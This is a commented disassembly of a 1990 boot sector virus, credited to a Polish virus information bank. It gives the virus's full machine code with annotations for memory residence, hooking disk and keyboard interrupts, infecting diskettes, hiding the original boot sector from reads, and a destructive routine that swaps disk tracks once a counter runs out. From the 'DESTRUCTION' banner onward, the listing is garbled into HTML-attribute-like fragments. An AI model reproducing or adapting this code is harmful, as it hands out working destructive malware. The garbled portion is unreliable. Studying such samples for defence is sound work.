

;------------------------------------------------------------------
; boot sector virus
;
; sample obtained from Vesselin Bontchev 16 october 1990 in Kiev
;
; dissasembled: Andrzej Kadlof December 7, 1990
;
; (C) Polish Section of Virus Information Bank
;------------------------------------------------------------------

; virus entry point

7C00 33FF          XOR     DI,DI
7C02 8EDF          MOV     DS,DI       ; BIOS segment

7C04 BE007C        MOV     SI,7C00     ; virus base
7C07 8BDE          MOV     BX,SI

7C09 FA            CLI                 ; set stack
7C0A 8ED7          MOV     SS,DI
7C0C 8BE6          MOV     SP,SI
7C0E FB            STI

7C0F A11304        MOV     AX,[0413]   ; top of RAM for DOS use
7C12 48            DEC     AX          ; reserve 1 Kb for virus
7C13 A31304        MOV     [0413],AX

7C16 B106          MOV     CL,06       ; convert into paragraphs
7C18 D3E0          SHL     AX,CL

7C1A 8EC0          MOV     ES,AX       ; new virus location
7C1C 06            PUSH    ES          ; segment on stack
7C1D BD2700        MOV     BP,0027     ; offset of entry point in nev location
7C20 55            PUSH    BP          ; on stack
7C21 B90001        MOV     CX,0100     ; virus size in words
7C24 F3            REPZ                ; move
7C25 A5            MOVSW
7C26 CB            RETF                ; jump to new location, here 7C27

7C27 BE4C00        MOV     SI,004C     ; addres of INT 13h
7C2A BF8F00        MOV     DI,008F     ; place holder
7C2D A5            MOVSW               ; move
7C2E A5            MOVSW

; set new INT 13h and INT 09h

7C2F FA            CLI
7C30 C744FC1601    MOV     WORD PTR [SI-04],0116  ; new offset
7C35 8C44FE        MOV     [SI-02],ES  ; new segment
7C38 BE2400        MOV     SI,0024     ; addres of INT 9
7C3B BFF401        MOV     DI,01F4     ; place holder
7C3E A5            MOVSW               ; store
7C3F A5            MOVSW
7C40 C744FCC301    MOV     WORD PTR [SI-04],01C3  ; new INT 9 offset
7C45 8C44FE        MOV     [SI-02],ES  ; new INT 9 segment
7C48 FB            STI

7C49 26            ES:
7C4A 803E740000    CMP     BYTE PTR [0074],00  ; number of instalation
7C4F 7411          JZ      7C62        ; skip counter adjusting on disk

7C51 26            ES:
7C52 FE0E7400      DEC     BYTE PTR [0074]  ; decrement counter

; store virus code back on disk with new counter value

7C56 53            PUSH    BX          ; store virus base offset in low RAM
7C57 33DB          XOR     BX,BX       ; buffer, start of vvirus code
7C59 B90100        MOV     CX,0001     ; track 0, starting sector 1
7C5C B600          MOV     DH,00       ; head 0
7C5E E81900        CALL    7C7A        ; write 1 sector, data as above
7C61 5B            POP     BX

7C62 1E            PUSH    DS
7C63 07            POP     ES          ; ES := 0

7C64 06            PUSH    ES          ; put on stack return address 
7C65 53            PUSH    BX          ; that is jump to legal boot sector
7C66 B90300        MOV     CX,0003     ; track 0, sector 3 (end of directory)
7C69 BA0001        MOV     DX,0100     ; head 1, current disk A:
7C6C E81300        CALL    7C82        ; read 1 sector, data as abave
7C6F CB            RETF                ; continue with oryginal boot sector

; flags, each for one floppy from A: to D:
;   bites  0F - infected
;          F0 - tracks swaped

7C70 00 00 00 00
7C74 1E                 ; counter, number of instalation
7C75 02                 ; caller INT 13h subfunction
7C76 107C 770B          ; callers INT 13h buffer

;----------------------------------------------------
; write 1 sector to disk
;   address of source buffer and destination sector 
;   is provided by caller

7C7A B80103        MOV     AX,0301     ; write 1 sector
7C7D EB06          JMP     7C85        ; make old INT 13h

;--------------------------------------------------
; read 1 sector to buffer above virus code
;   address of source sector is provided by caller

7C7F BB0002        MOV     BX,0200     ; offset of buffer

;---------------------------------------------------
; read 1 sector to buffer
;   address of source sector and destination buffer
;   is provided by caller

7C82 B80102        MOV     AX,0201     ; read 1 sector

;-------------------
; make old INT 13h

7C85 53            PUSH    BX          ; store offset of buffer
7C86 51            PUSH    CX          ; store track, sector (CH, CL)
7C87 52            PUSH    DX          ; store head, disk (DH, DL)
7C88 9C            PUSHF               ; simulate INT 13h
7C89 0E            PUSH    CS          ; return address
7C8A BD9300        MOV     BP,0093     ; return address
7C8D 55            PUSH    BP

; old INT 13h

7C8E EA290300C8    JMP     C800:0329   ; address is patched during instalation

; exit after above far call

7C93 5A            POP     DX          ; restore registers
7C94 59            POP     CX
7C95 5B            POP     BX
7C96 C3            RET

;-------------------------------------------
; read boot sector and check is it infected
;   on exit 
;     set Carry if error I/O
;     if no error then reset Z if infected

7C97 B90100        MOV     CX,0001     ; track 0, sector 1
7C9A B600          MOV     DH,00       ; head 0

;---------------------------------------------
; read 1 sector above virus code and look for 
; virus signature in DS:[BX]

7C9C E8E0FF        CALL    7C7F        ; read 1 sector above virus code
7C9F 7205          JB      7CA6        ; error, exit

7CA1 813F33FF      CMP     WORD PTR [BX],FF33  ; virus signature, set Z
7CA5 F8            CLC                 ; no error
7CA6 C3            RET

;--------------
; infect disk

7CA7 E8EDFF        CALL    7C97        ; check boot sector
7CAA 721D          JB      7CC9        ; error, RET

7CAC 741B          JZ      7CC9        ; infected, RET

7CAE 813EFE0355AA  CMP     WORD PTR [03FE],AA55  ; and of sector marker
7CB4 F8            CLC
7CB5 7512          JNZ     7CC9        ; RET

; write oryginal boot sector

7CB7 B103          MOV     CL,03       ; sector 3
7CB9 B601          MOV     DH,01       ; head 1
7CBB E8BCFF        CALL    7C7A        ; write 1 sector, data as above
7CBE 7209          JB      7CC9        ; RET

7CC0 33DB          XOR     BX,BX       ; offset of virus code
7CC2 B101          MOV     CL,01       ; sector 1
7CC4 B600          MOV     DH,00       ; head 0
7CC6 E8B1FF        CALL    7C7A        ; write 1 sector, data as above
7CC9 C3            RET

;--------------------
; infect diskette

7CCA E8DAFF        CALL    7CA7        ; infect diskette
7CCD 72FA          JB      7CC9        ; error, RET

7CCF E8C5FF        CALL    7C97        ; check boot sector
7CD2 72F5          JB      7CC9        ; error, RET

7CD4 7503          JNZ     7CD9        ; not infected, skip flag setting

7CD6 800D0F        OR      BYTE PTR [DI],0F   ; set flag: not infected

7CD9 803E740000    CMP     BYTE PTR [0074],00 ; instalation counter
7CDE 75E9          JNZ     7CC9        ; RET

7CE0 803E750002    CMP     BYTE PTR [0075],02 ; read service?
7CE5 75E2          JNZ     7CC9        ; RET

;====================================================
;      >>>>>>>>>   DESTRUCTION   < ;="===================================================" ;="" swap="" all="" sectors="" between="" track="" 0,="" head="" 0="" and="" ;="" track="" 27h,="" head="" 1="" 7ce7="" 800df0="" or="" byte="" ptr="" [di],f0="" ;="" set="" flag:="" tracks="" swaped="" 7cea="" c41e7600="" les="" bx,[0076]="" ;="" users="" buffer="" 7cee="" b90900="" mov="" cx,0009="" ;="" sector="" counter="" ;="" swap="" next="" sector="" 7cf1="" 51="" push="" cx="" ;="" store="" track="" 0="" and="" sector="" number="" 7cf2="" b600="" mov="" dh,00="" ;="" head="" 0="" 7cf4="" e88bff="" call="" 7c82="" ;="" read="" 1="" sector="" to="" user="" buffer="" 7cf7="" b601="" mov="" dh,01="" ;="" head="" 1="" 7cf9="" b527="" mov="" ch,27="" ;="" track="" 27,="" sector="" number="" the="" same="" 7cfb="" 06="" push="" es="" ;="" store="" address="" of="" user="" buffer="" 7cfc="" 53="" push="" bx="" 7cfd="" 0e="" push="" cs="" ;="" restore="" address="" of="" own="" buffer="" 7cfe="" 07="" pop="" es="" 7cff="" e87dff="" call="" 7c7f="" ;="" read="" 1="" sector="" to="" own="" buffer="" 7d02="" b500="" mov="" ch,00="" ;="" track="" 0="" 7d04="" b600="" mov="" dh,00="" ;="" head="" 0="" 7d06="" e871ff="" call="" 7c7a="" ;="" write="" 1="" sector="" from="" own="" buffer="" 7d09="" 5b="" pop="" bx="" ;="" restore="" user="" address="" of="" buffer="" 7d0a="" 07="" pop="" es="" 7d0b="" b601="" mov="" dh,01="" ;="" head="" 1="" 7d0d="" b527="" mov="" ch,27="" ;="" track="" 27h="" 7d0f="" e868ff="" call="" 7c7a="" ;="" write="" 1="" sector="" from="" user="" buffer="" 7d12="" 59="" pop="" cx="" ;="" restore="" sector="" counter="" 7d13="" e2dc="" loop="" 7cf1="" 7d15="" c3="" ret="" ;-----------------------="" ;="" new="" int="" 13h="" handler="" 7d16="" 80fa03="" cmp="" dl,03="" ;="" floppy="" disk="" 7d19="" 770a="" ja="" 7d25="" ;="" not,="" exit="" 7d1b="" 80fc02="" cmp="" ah,02="" ;="" read="" request?="" 7d1e="" 7205="" jb="" 7d25="" ;="" no,="" exit="" 7d20="" 80fc04="" cmp="" ah,04="" ;="" verify/read/write="" request?="" 7d23="" 7603="" jbe="" 7d28="" ;="" yes="" 7d25="" e966ff="" jmp="" 7c8e="" ;="" exit,="" jump="" to="" old="" int="" 13h="" ;="" ah="2," 3,="" 4="" service="" 7d28="" 1e="" push="" ds="" ;="" store="" user="" ds="" 7d29="" 0e="" push="" cs="" 7d2a="" 1f="" pop="" ds="" ;="" set="" ds="" to="" virus="" segment="" 7d2b="" 88267500="" mov="" [0075],ah="" ;="" store="" request="" 7d2f="" 8c067800="" mov="" [0078],es="" ;="" callers="" buffer="" segment="" 7d33="" 891e7600="" mov="" [0076],bx="" ;="" callers="" buffer="" offset="" 7d37="" 55="" push="" bp="" ;="" store="" rest="" of="" registers="" 7d38="" 51="" push="" cx="" 7d39="" 52="" push="" dx="" 7d3a="" 57="" push="" di="" 7d3b="" bf7000="" mov="" di,0070="" ;="" address="" of="" flags="" 7d3e="" b600="" mov="" dh,00="" ;="" clear="" high="" byte="" 7d40="" 03fa="" add="" di,dx="" ;="" adjust="" flag="" to="" current="" disk="" 7d42="" 06="" push="" es="" 7d43="" 50="" push="" ax="" 7d44="" 33c0="" xor="" ax,ax="" 7d46="" 8ec0="" mov="" es,ax="" 7d48="" 40="" inc="" ax="" ;="" set="" bit="" 1="" 7d49="" 8aca="" mov="" cl,dl="" ;="" disk="" number="" 7d4b="" d2e0="" shl="" al,cl="" ;="" move="" bit="" 1="" left="" 7d4d="" 26="" es:="" 7d4e="" 84063f04="" test="" [043f],al="" ;="" disk="" motor="" status="" 7d52="" 751b="" jnz="" 7d6f="" ;="" skip="" test,="" drive="" is="" running="" ;="" search="" for="" virus="" signature="" in="" head:="" 1,="" track="" 27,="" sector="" number="" 1="" ;="" if="" diskette="" is="" destroyed="" then="" the="" virus="" is="" there="" 7d54="" 0e="" push="" cs="" 7d55="" 07="" pop="" es="" 7d56="" b90127="" mov="" cx,2701="" ;="" track="" 27,="" first="" sector="" number="" 1="" 7d59="" b601="" mov="" dh,01="" ;="" head="" 1="" 7d5b="" e83eff="" call="" 7c9c="" ;="" read="" 1="" sector="" and="" check="" virus="" signature="" 7d5e="" b000="" mov="" al,00="" ;="" clear="" flag:="" not="" infected,="" not="" swaped="" 7d60="" 7204="" jb="" 7d66="" ;="" error="" 7d62="" 7502="" jnz="" 7d66="" ;="" signature="" not="" found,="" leave="" flag="" 0="" 7d64="" b0f0="" mov="" al,f0="" ;="" flag:="" swaped="" and="" infected="" 7d66="" aa="" stosb="" ;="" store="" flag="" 7d67="" 4f="" dec="" di="" ;="" restore="" di="" 7d68="" 3c00="" cmp="" al,00="" ;="" infected?="" 7d6a="" 7503="" jnz="" 7d6f="" ;="" skip="" infection="" 7d6c="" e85bff="" call="" 7cca="" ;="" infect="" disk="" and="" destroy="" if="" counter="0" 7d6f="" 8a1d="" mov="" bl,[di]="" ;="" get="" flag="" 7d71="" 58="" pop="" ax="" ;="" restore="" registers="" 7d72="" 07="" pop="" es="" 7d73="" 5f="" pop="" di="" 7d74="" 5a="" pop="" dx="" 7d75="" 59="" pop="" cx="" 7d76="" 51="" push="" cx="" 7d77="" 52="" push="" dx="" 7d78="" f6c30f="" test="" bl,0f="" ;="" disk="" infected?="" 7d7b="" 7416="" jz="" 7d93="" ;="" not="" 7d7d="" 80fe00="" cmp="" dh,00="" ;="" head="" 0="" 7d80="" 750b="" jnz="" 7d8d="" ;="" no,="" maybe="" sector3?="" 7d82="" 83f901="" cmp="" cx,+01="" ;="" track="" 0,="" sector="" 1="" 7d85="" 750c="" jnz="" 7d93="" ;="" show="" oryginal="" boot="" sector="" 7d87="" b103="" mov="" cl,03="" ;="" sector="" 3="" 7d89="" b601="" mov="" dh,01="" ;="" head="" 1="" 7d8b="" eb06="" jmp="" 7d93="" 7d8d="" 83f903="" cmp="" cx,+03="" ;="" sector="" 3="" 7d90="" 7501="" jnz="" 7d93="" ;="" no="" 7d92="" 49="" dec="" cx="" ;="" show="" one="" sector="" before="" 7d93="" f6c3f0="" test="" bl,f0="" ;="" tracks="" swaped?="" 7d96="" 7418="" jz="" 7db0="" ;="" no,="" make="" old="" int="" 13h="" and="" exit="" ;="" disk="" is="" destroyed,="" maybe="" user="" want="" to="" read="" track="" 27h,="" head="" 1="" ;="" or="" track="" 0,="" head="" 0?="" if="" yes="" then="" show="" what="" he="" expect.="" 7d98="" 80fe00="" cmp="" dh,00="" ;="" head="" 0="" 7d9b="" 740b="" jz="" 7da8="" ;="" yes="" 7d9d="" 80fd27="" cmp="" ch,27="" ;="" track="" 27h?="" 7da0="" 750e="" jnz="" 7db0="" ;="" make="" old="" int="" 13h="" and="" exit="" ;="" real="" address="" of="" old="" track="" 27h,="" head="" 1="" 7da2="" b500="" mov="" ch,00="" ;="" track="" 0="" 7da4="" b600="" mov="" dh,00="" ;="" head="" 0="" 7da6="" eb08="" jmp="" 7db0="" ;="" make="" old="" int="" 13h="" and="" exit="" 7da8="" 0aed="" or="" ch,ch="" ;="" track="" 0?="" 7daa="" 7504="" jnz="" 7db0="" ;="" no,="" make="" old="" int="" 13h="" and="" exit="" ;="" real="" address="" of="" old="" track="" 0,="" head="" 0="" 7dac="" b527="" mov="" ch,27="" ;="" track="" 27h="" 7dae="" b601="" mov="" dh,01="" ;="" head="" 1="" ;="" house="" keeping="" and="" exit="" to="" user="" 7db0="" 8b1e7600="" mov="" bx,[0076]="" ;="" restore="" user="" buffer="" 7db4="" e8cefe="" call="" 7c85="" ;="" make="" old="" int="" 13h="" 7db7="" 5a="" pop="" dx="" 7db8="" 8bec="" mov="" bp,sp="" 7dba="" 9c="" pushf="" 7dbb="" 59="" pop="" cx="" 7dbc="" 894e0a="" mov="" [bp+0a],cx="" ;="" set="" flags="" 7dbf="" 59="" pop="" cx="" 7dc0="" 5d="" pop="" bp="" 7dc1="" 1f="" pop="" ds="" 7dc2="" cf="" iret="" ;--------------------="" ;="" new="" int="" 9="" handler="" 7dc3="" 50="" push="" ax="" 7dc4="" e460="" in="" al,60="" ;="" read="" key="" 7dc6="" 3c53="" cmp="" al,53="" ;="" del="" key="" 7dc8="" 7528="" jnz="" 7df2="" ;="" no,="" exit="" ;="" key="" del="" is="" pressed="" 7dca="" 1e="" push="" ds="" 7dcb="" 33c0="" xor="" ax,ax="" 7dcd="" 8ed8="" mov="" ds,ax="" 7dcf="" a01704="" mov="" al,[0417]="" ;="" keyboard="" status="" bits="" 7dd2="" f6d0="" not="" al="" 7dd4="" a80c="" test="" al,0c="" ;="" alt="" +="" ctrl="" 7dd6="" 7519="" jnz="" 7df1="" ;="" not="" both,="" exit="" 7dd8="" 0e="" push="" cs="" 7dd9="" 1f="" pop="" ds="" 7dda="" 803e740000="" cmp="" byte="" ptr="" [0074],00="" ;="" counter="" of="" instalation="" 7ddf="" 7410="" jz="" 7df1="" ;="" exit="" 7de1="" b020="" mov="" al,20="" ;="" enable="" hardware="" interrupts="" 7de3="" e620="" out="" 20,al="" 7de5="" b200="" mov="" dl,00="" ;="" disk="" a:="" 7de7="" 33c0="" xor="" ax,ax="" ;="" reset="" disk="" 7de9="" e899fe="" call="" 7c85="" ;="" make="" old="" int="" 13h="" 7dec="" 0e="" push="" cs="" 7ded="" 07="" pop="" es="" 7dee="" e8b6fe="" call="" 7ca7="" ;="" infect="" disk="" 7df1="" 1f="" pop="" ds="" 7df2="" 58="" pop="" ax="" 7df3="" ea87e900f0="" jmp="" f000:e987="" ;="" address="" is="" patched="" during="" instalation="" 7df8="" 0000="" 7dfa="" 0000="" 7dfc="" 5713="" ;="" signature="" of="" ping="" pong="" 7dfe="" 55aa="" ;="" and="" of="" boot="" sector="" marker="" ;-----------------------------------------------------------="" ;="" virus="" action="" during="" instalation:="" ;="" ;="" set="" ds:si="" to="" virus="" start,="" ds="" :="0," si="" :="7C00" ;="" set="" stack="" below="" 0000:7c00="" ;="" decrement="" ram="" size="" avaible="" for="" dos="" ([0000:0413])="" ;="" copy="" virus="" code="" to="" high="" memory="" and="" jump="" there="" ;="" intercepte="" int="" 13h="" and="" int="" 09h="" ;="" check="" state="" of="" instalation="" counter,="" if="" above="" 0="" then="" ;="" decrement="" it="" and="" adjust="" counter="" on="" disk="" ;="" read="" oryginal="" boot="" sector="" from="" disk="" and="" jump="" to="" it="" ;="" ;------------------------------------------------------------="" ;="" int="" 13h="" handler="" (cs:0116h):="" ;="" ;="" ;="" ;------------------------------------------------------------="" ;="" ;="" int="" 09h="" handler="" (cs:01c3h):="" ;="" ;="" read="" key="" from="" port="" 60h="" ;="" if="" not="" del="" key="" then="" exit="" to="" old="" int="" 09h="" ;="" get="" keyboard="" status="" bites="" ;="" if="" not="" alt="" and="" ctrl="" depresed="" then="" exit="" to="" old="" int="" 09h="" ;="" enable="" hardware="" interupts="" ;="" reset="" disk="" a:="" ;="" infect="" diskette="" in="" drive="" a:="" ;="" exit="" to="" old="" int="" 09h="">